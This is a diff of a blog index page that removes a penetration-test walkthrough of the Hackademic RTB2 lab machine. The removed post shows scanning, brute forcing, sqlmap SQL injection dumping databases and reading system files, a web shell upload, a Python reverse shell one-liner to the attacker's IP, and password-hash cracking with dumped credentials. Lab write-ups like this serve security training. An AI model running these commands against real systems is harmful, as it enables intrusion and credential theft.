@@ -9,7 +9,7 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Hackademic: RTB2 We gained the IP address 192.168.80.150 for our testing target. Nmap output: 1
+  <meta name="description" content="Image: Hackademic: RTB1 We gained the IP address 192.168.80.146 for our testing target. Nmap output: 1
 2
 3
 4
@@ -22,8 +22,7 @@
 11
 12
 13
-14
-root@kali32:# &hellip;">
+root@kali32:~# &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -92,818 +91,6 @@ root@kali32:# &hellip;">
     <div id="content">
       <div class="blog-index">
   
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/03/hackademic-rtb2/">Hackademic: RTB2</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-03T17:26:01+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>5:26 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb2,18/">Hackademic: RTB2</a></p>
-
-<p>We gained the IP address 192.168.80.150 for our testing target.</p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
-</span><span class='line'>Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-</span><span class='line'>SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
-</span><span class='line'>Nmap scan report for 192.168.80.150
-</span><span class='line'>Host is up (0.00039s latency).
-</span><span class='line'>Not shown: 65533 closed ports
-</span><span class='line'>PORT    STATE    SERVICE
-</span><span class='line'>80/tcp  open     http
-</span><span class='line'>666/tcp filtered doom
-</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
-</span><span class='line'>
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It seems that the port 666 is filtered by the firewall. After running nmap scan
-several times, we found the port to be open.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
-</span><span class='line'>Nmap scan report for 192.168.80.150
-</span><span class='line'>Host is up (0.00036s latency).
-</span><span class='line'>Not shown: 65533 closed ports
-</span><span class='line'>PORT    STATE    SERVICE
-</span><span class='line'>80/tcp  open     http
-</span><span class='line'>666/tcp filtered doom
-</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
-</span><span class='line'>
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# nmap 192.168.80.150 -p-
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:56 CEST
-</span><span class='line'>Nmap scan report for 192.168.80.150
-</span><span class='line'>Host is up (0.00038s latency).
-</span><span class='line'>Not shown: 65533 closed ports
-</span><span class='line'>PORT    STATE SERVICE
-</span><span class='line'>80/tcp  open  http
-</span><span class='line'>666/tcp open  doom
-</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
-</span><span class='line'>
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Nikto output for port 80:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h http://192.168.80.150/
-</span><span class='line'>- Nikto v2.1.6
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ Target IP:          192.168.80.150
-</span><span class='line'>+ Target Hostname:    192.168.80.150
-</span><span class='line'>+ Target Port:        80
-</span><span class='line'>+ Start Time:         2015-04-30 10:15:26 (GMT2)
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
-</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
-</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
-</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
-</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
-</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
-</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
-</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
-</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
-</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
-</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
-</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
-</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
-</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007
-</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
-</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
-</span><span class='line'>+ 7495 requests: 0 error(s) and 15 item(s) reported on remote host
-</span><span class='line'>+ End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The web page suggests to look for SQLi, unfortunately we were not able to find
-any here.</p>
-
-<p>Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# hydra 192.168.80.150 http-form-post "/check.php:username=^USER^&password=^PASS^&Submit=Check%21:wrong credentials" -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f 
-</span><span class='line'>root@kali32:/tmp# joomscan -u http://192.168.80.150:666/index.php -oh</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After a little time, we found SQLi in Joomla and dumped the whole database:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --dump-all</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Trying to crack MySQL hashes was without success.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv 
-</span><span class='line'>Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
-</span><span class='line'>localhost,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
-</span><span class='line'>HackademicRTB2,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
-</span><span class='line'>127.0.0.1,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
-</span><span class='line'>localhost,debian-sys-maint,*F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
-</span><span class='line'>localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,N,N,N,N,N,&lt;blank>,N,N,N,0,N,N,N,&lt;blank>,N,N,N,N,&lt;blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N
-</span><span class='line'>
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john --format=mysql-sha1 hashes.csv</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We parse the Joomla usernames and passwords and crack using John:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv 
-</span><span class='line'>id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
-</span><span class='line'>62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,&lt;blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
-</span><span class='line'>63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,&lt;blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
-</span><span class='line'>64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,&lt;blank>,2011-01-22 10:18:06,0000-00-00 00:00:00
-</span><span class='line'>
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  
-</span><span class='line'>username:password
-</span><span class='line'>Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
-</span><span class='line'>JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
-</span><span class='line'>BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
-</span><span class='line'>
-</span><span class='line'>root@kali32:/usr/share/dirb# john --list=subformats
-</span><span class='line'>Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
-</span><span class='line'>Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
-</span><span class='line'>Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  > /tmp/joomla.pass 
-</span><span class='line'>
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
-</span><span class='line'>...
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 --show
-</span><span class='line'>JSmith:matrix
-</span><span class='line'>BTallor:victim
-</span><span class='line'>test:test
-</span><span class='line'>
-</span><span class='line'>3 password hashes cracked, 1 left</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/passwd
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/issue</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The target is Ubuntu 10.04, we can predict better the filenames in /etc:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/phpmyadmin/config.inc.php</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We generate and upload the weevely shell, then upgrade to python shell over netcat:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-write=weevely.php --file-dest=/var/www/test1.php
-</span><span class='line'>
-</span><span class='line'>root@kali32:/usr/share/exploitdb# nc -lp 1338
-</span><span class='line'>
-</span><span class='line'>www-data@HackademicRTB2:/tmp $ python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1338
-</span><span class='line'>www-data@HackademicRTB2:/tmp$</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The following credentials could be used to log in phpMyAdmin using root:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">HackademicRTB2</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">configuration</span><span class="o">.</span><span class="nx">php</span>
-</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="k">class</span> <span class="nc">JConfig</span> <span class="p">{</span>
-</span><span class='line'><span class="cm">/* Site Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$offline</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$offline_message</span> <span class="o">=</span> <span class="s1">&#39;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$sitename</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$editor</span> <span class="o">=</span> <span class="s1">&#39;tinymce&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$list_limit</span> <span class="o">=</span> <span class="s1">&#39;20&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$legacy</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Debug Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Database Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">&#39;mysql&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;yUtJklM97W&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;joomla&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="s1">&#39;jos_&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Server Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$live_site</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="s1">&#39;iFzlVUCg9BBPoUDU&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$gzip</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$error_reporting</span> <span class="o">=</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$helpurl</span> <span class="o">=</span> <span class="s1">&#39;http://help.joomla.org&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$xmlrpc_server</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_host</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_port</span> <span class="o">=</span> <span class="s1">&#39;21&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_pass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_root</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_enable</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$force_ssl</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Locale Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$offset_user</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Mail Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="s1">&#39;mail&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="s1">&#39;admin@hackademirtb2.com&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="s1">&#39;/usr/sbin/sendmail&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtpsecure</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtpport</span> <span class="o">=</span> <span class="s1">&#39;25&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtpuser</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtppass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$smtphost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Cache Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$caching</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$cachetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$cache_handler</span> <span class="o">=</span> <span class="s1">&#39;file&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* Meta Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$MetaDesc</span> <span class="o">=</span> <span class="s1">&#39;Joomla! - the dynamic portal engine and content management system&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$MetaKeys</span> <span class="o">=</span> <span class="s1">&#39;joomla, Joomla&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$MetaTitle</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$MetaAuthor</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cm">/* SEO Settings */</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$sef</span>           <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$sef_rewrite</span>   <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
